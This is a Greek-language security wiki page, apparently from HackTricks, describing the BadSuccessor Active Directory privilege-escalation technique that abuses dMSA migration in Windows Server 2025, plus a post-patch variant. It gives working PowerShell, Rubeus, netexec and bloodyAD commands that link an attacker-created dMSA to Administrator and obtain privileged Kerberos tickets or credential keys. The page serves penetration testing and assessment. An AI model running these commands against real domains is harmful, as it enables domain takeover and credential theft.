# BadSuccessor

{{#include ../../../banners/hacktricks-training.md}}

## Επισκόπηση

Το **BadSuccessor** κάνει κατάχρηση της ροής εργασιών μετεγκατάστασης **delegated Managed Service Account** (**dMSA**) που εισήχθη στο **Windows Server 2025**. Ένα dMSA μπορεί να συνδεθεί με έναν παλιό λογαριασμό μέσω του **`msDS-ManagedAccountPrecededByLink`** και να περάσει από τις καταστάσεις μετεγκατάστασης που αποθηκεύονται στο **`msDS-DelegatedMSAState`**. Αν ένας attacker μπορεί να δημιουργήσει ένα dMSA σε ένα OU με δικαιώματα εγγραφής και να ελέγξει αυτά τα attributes, το KDC μπορεί να εκδώσει tickets για το dMSA που ελέγχει ο attacker, με το **πλαίσιο εξουσιοδότησης του συνδεδεμένου λογαριασμού**.<sup>[[2]](#references)</sup>

Στην πράξη, αυτό σημαίνει ότι ένας χρήστης με χαμηλά προνόμια και μόνο δικαιώματα OU που του έχουν εκχωρηθεί μπορεί να δημιουργήσει ένα νέο dMSA, να το συνδέσει με τον `Administrator`, να ολοκληρώσει την κατάσταση μετεγκατάστασης και, στη συνέχεια, να αποκτήσει ένα TGT του οποίου το PAC περιέχει προνομιούχες ομάδες, όπως οι **Domain Admins**.<sup>[[2]](#references)</sup>

## Σημαντικές λεπτομέρειες για τη μετεγκατάσταση dMSA

- Το dMSA είναι μια δυνατότητα του **Windows Server 2025**.
- Η `Start-ADServiceAccountMigration` ορίζει τη μετεγκατάσταση στην κατάσταση **started**.
- Η `Complete-ADServiceAccountMigration` ορίζει τη μετεγκατάσταση στην κατάσταση **completed**.
- `msDS-DelegatedMSAState = 1` σημαίνει ότι η μετεγκατάσταση ξεκίνησε.
- `msDS-DelegatedMSAState = 2` σημαίνει ότι η μετεγκατάσταση ολοκληρώθηκε.
- Κατά τη νόμιμη μετεγκατάσταση, το dMSA προορίζεται να αντικαταστήσει απρόσκοπτα τον λογαριασμό που καταργείται, επομένως το KDC/LSA διατηρεί την πρόσβαση που είχε ήδη ο προηγούμενος λογαριασμός.<sup>[[3]](#references)</sup>

Το Microsoft Learn σημειώνει επίσης ότι κατά τη μετεγκατάσταση ο αρχικός λογαριασμός συνδέεται με το dMSA και ότι το dMSA προορίζεται να έχει πρόσβαση σε ό,τι μπορούσε να προσπελάσει ο παλιός λογαριασμός.<sup>[[3]](#references)</sup> Αυτή είναι η υπόθεση ασφαλείας την οποία εκμεταλλεύεται το BadSuccessor.<sup>[[2]](#references)</sup>

## Απαιτήσεις

1. Ένας domain στον οποίο υπάρχει **dMSA**, δηλαδή υποστηρίζεται το **Windows Server 2025** από την πλευρά του AD.
2. Ο attacker μπορεί να **δημιουργήσει** αντικείμενα `msDS-DelegatedManagedServiceAccount` σε κάποιο OU ή έχει αντίστοιχα ευρεία δικαιώματα δημιουργίας θυγατρικών αντικειμένων εκεί.
3. Ο attacker μπορεί να **εγγράψει** τα σχετικά attributes του dMSA ή έχει πλήρη έλεγχο του dMSA που μόλις δημιούργησε.
4. Ο attacker μπορεί να ζητήσει Kerberos tickets από περιβάλλον συνδεδεμένο με domain ή μέσω tunnel που έχει πρόσβαση σε LDAP/Kerberos.<sup>[[2]](#references)</sup>

### Πρακτικοί έλεγχοι

Η πιο σαφής ένδειξη για τον χειριστή είναι να επαληθεύσει το επίπεδο domain/forest και να επιβεβαιώσει ότι το περιβάλλον χρησιμοποιεί ήδη τη νέα στοίβα Server 2025:

```powershell
Get-ADDomain | Select Name,DomainMode
Get-ADForest | Select Name,ForestMode
```

Αν δείτε τιμές όπως `Windows2025Domain` και `Windows2025Forest`, θέστε το **BadSuccessor / dMSA migration abuse** ως έλεγχο προτεραιότητας.

Μπορείτε επίσης να απαριθμήσετε τα OUs με δικαιώματα εγγραφής στα οποία έχει ανατεθεί η δημιουργία dMSA, χρησιμοποιώντας δημόσια εργαλεία:<sup>[[1]](#references)</sup>

```powershell
.\Get-BadSuccessorOUPermissions.ps1
```

```bash
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor
```

## Ροή κατάχρησης

1. Δημιουργήστε ένα dMSA σε ένα OU όπου έχετε εκχωρημένα δικαιώματα create-child.
2. Ορίστε το **`msDS-ManagedAccountPrecededByLink`** στο DN ενός προνομιούχου στόχου, όπως `CN=Administrator,CN=Users,DC=corp,DC=local`.
3. Ορίστε το **`msDS-DelegatedMSAState`** σε `2` για να επισημάνετε τη μετεγκατάσταση ως ολοκληρωμένη.
4. Ζητήστε ένα TGT για το νέο dMSA και χρησιμοποιήστε το ticket που επιστράφηκε για πρόσβαση σε προνομιούχες υπηρεσίες.<sup>[[2]](#references)</sup>

Παράδειγμα PowerShell:<sup>[[2]](#references)</sup>

```powershell
New-ADServiceAccount -Name attacker_dMSA -DNSHostName host.corp.local -Path "OU=Delegated,DC=corp,DC=local"
Set-ADServiceAccount attacker_dMSA -Add @{
    msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=corp,DC=local"
}
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```

Παραδείγματα αιτημάτων Ticket / επιχειρησιακών εργαλείων:<sup>[[1]](#references)[[2]](#references)</sup>

```bash
Rubeus.exe asktgs /targetuser:attacker_dMSA$ /service:krbtgt/corp.local /dmsa /opsec /nowrap /ptt /ticket:<machine_tgt>
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor -o TARGET_OU='OU=Delegated,DC=corp,DC=local' DMSA_NAME=attacker TARGET_ACCOUNT=Administrator
```

## Γιατί αυτό είναι κάτι περισσότερο από privilege escalation

Κατά τη νόμιμη μετεγκατάσταση, τα Windows χρειάζονται επίσης το νέο dMSA για να χειρίζεται tickets που εκδόθηκαν για τον προηγούμενο λογαριασμό πριν από τη μετάβαση. Γι' αυτό το υλικό ticket που σχετίζεται με dMSA μπορεί να περιλαμβάνει **τρέχοντα** και **προηγούμενα** keys στη ροή **`KERB-DMSA-KEY-PACKAGE`**.<sup>[[2]](#references)</sup>

Για μια πλαστή μετεγκατάσταση που ελέγχει ο επιτιθέμενος, αυτή η συμπεριφορά μπορεί να μετατρέψει το BadSuccessor σε:<sup>[[2]](#references)</sup>

- **Privilege escalation** μέσω κληρονόμησης προνομιούχων group SID στο PAC.
- **Έκθεση υλικού διαπιστευτηρίων**, επειδή ο χειρισμός των προηγούμενων keys μπορεί να εκθέσει υλικό ισοδύναμο με το RC4/NT hash του προκατόχου σε ευάλωτες ροές εργασίας.

Αυτό καθιστά την τεχνική χρήσιμη τόσο για άμεση κατάληψη του domain όσο και για επόμενες ενέργειες, όπως pass-the-hash ή ευρύτερη παραβίαση διαπιστευτηρίων.

## BetterSuccessor μετά το KDC patch

Το patched KDC επικυρώνει και τις δύο πλευρές μιας μετεγκατάστασης dMSA. Εκτός από το `msDS-ManagedAccountPrecededByLink` του dMSA και την κατάσταση μετεγκατάστασης, ο προκάτοχος πρέπει να δείχνει πίσω στο dMSA μέσω του `msDS-SupersededManagedAccountLink` και να έχει συμβατή τιμή `msDS-SupersededServiceAccountState`. Ένας μονόδρομος σύνδεσμος πλέον αποτυγχάνει· ένας λογαριασμός που μπορεί μόνο να δημιουργήσει dMSA δεν μπορεί να ορίσει οποιονδήποτε αυθαίρετο προκάτοχο. Με `CreateChild` για dMSA σε ένα OU **και** αποτελεσματική πρόσβαση εγγραφής στα χαρακτηριστικά μετεγκατάστασης του επιλεγμένου λογαριασμού-στόχου, ένας επιτιθέμενος μπορεί να δημιουργήσει τον αμοιβαίο σύνδεσμο. Το ticket dMSA που προκύπτει μπορεί να μεταφέρει το πλαίσιο εξουσιοδότησης του προκατόχου και να εκθέσει τα keys του στο key package του dMSA. Πρόκειται για στοχευμένη διαδρομή πρόσβασης σε διαπιστευτήρια/ενίσχυσης προνομίων, όχι για απόδειξη ότι το αρχικό BadSuccessor με αυθαίρετο στόχο παραμένει εκμεταλλεύσιμο σε patched DCs.<sup>[[5]](#references)[[6]](#references)</sup>

Σε ένα lab όπου έχει επιβεβαιωθεί η πρόσβαση εγγραφής στον λογαριασμό-στόχο, το `bloodyAD` μπορεί να δημιουργήσει το dMSA και να εκτελέσει τις αντίστοιχες εγγραφές μετεγκατάστασης. Ζητήστε το ticket dMSA χρησιμοποιώντας το Kerberos material που επιστράφηκε και ελέγξτε τα πραγματικά δικαιώματα του λογαριασμού-στόχου προτού θεωρήσετε ότι ανακτήθηκαν τα προνόμιά του ή το hash του. Το όνομα της υποεντολής `badSuccessor` του εργαλείου δεν υποδηλώνει ότι ισχύει η μη patched συμπεριφορά μονόδρομης σύνδεσης.<sup>[[7]](#references)</sup>

```bash
KRB5CCNAME=operator.ccache bloodyAD -d example.local --host dc.example.local -k add badSuccessor test_dmsa --ou 'OU=DMSAHolder,DC=example,DC=local' -t 'CN=Target User,OU=Users,DC=example,DC=local'
```

## Σημειώσεις για την κατάσταση των ενημερώσεων κώδικα

Η αρχική συμπεριφορά του BadSuccessor **δεν είναι απλώς ένα θεωρητικό ζήτημα προεπισκόπησης του 2025**. Η Microsoft της απέδωσε το **CVE-2025-53779** και δημοσίευσε ενημέρωση ασφαλείας τον **Αύγουστο του 2025**.<sup>[[4]](#references)</sup> Διατηρήστε τεκμηριωμένη αυτή την επίθεση για:

- **labs / CTFs / ασκήσεις assume-breach**
- **μη ενημερωμένα περιβάλλοντα Windows Server 2025**
- **επικύρωση αναθέσεων δικαιωμάτων OU και έκθεσης dMSA κατά τις αξιολογήσεις**

Μην θεωρείτε ευάλωτο έναν τομέα Windows Server 2025 μόνο και μόνο επειδή υπάρχει dMSA· επαληθεύστε το επίπεδο ενημερώσεων κώδικα και δοκιμάστε προσεκτικά.

## Εργαλεία

- [Εργαλεία Akamai BadSuccessor](https://github.com/akamai/BadSuccessor)
- [SharpSuccessor](https://github.com/logangoins/SharpSuccessor)
- [Μονάδα `badsuccessor` του NetExec](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)

## References

- [1] [HTB: Eighteen - Κατάχρηση dMSA μέσω BadSuccessor για Domain Admin (0xdf)](https://0xdf.gitlab.io/2026/04/11/htb-eighteen.html)
- [2] [Akamai - BadSuccessor: Κατάχρηση dMSA για κλιμάκωση προνομίων στο Active Directory](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [3] [Microsoft Learn - Επισκόπηση των Delegated Managed Service Accounts](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/delegated-managed-service-accounts/delegated-managed-service-accounts-overview)
- [4] [Microsoft Security Response Center - CVE-2025-53779](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53779)
- [5] [Akamai - Ο BadSuccessor πέθανε, ζήτω ο BadSuccessor(?)](https://www.akamai.com/blog/security-research/badsuccessor-is-dead-analyzing-badsuccessor-patch)
- [6] [Altered Security - BetterSuccessor: Συνέχιση της κατάχρησης dMSA μετά την ενημέρωση κώδικα](https://www.alteredsecurity.com/post/bettersuccessor-still-abusing-dmsa-for-privilege-escalation-badsuccessor-after-patch)
- [7] [0xdf - HTB: Checkpoint](https://0xdf.gitlab.io/2026/10/24/htb-checkpoint.html)
{{#include ../../../banners/hacktricks-training.md}}
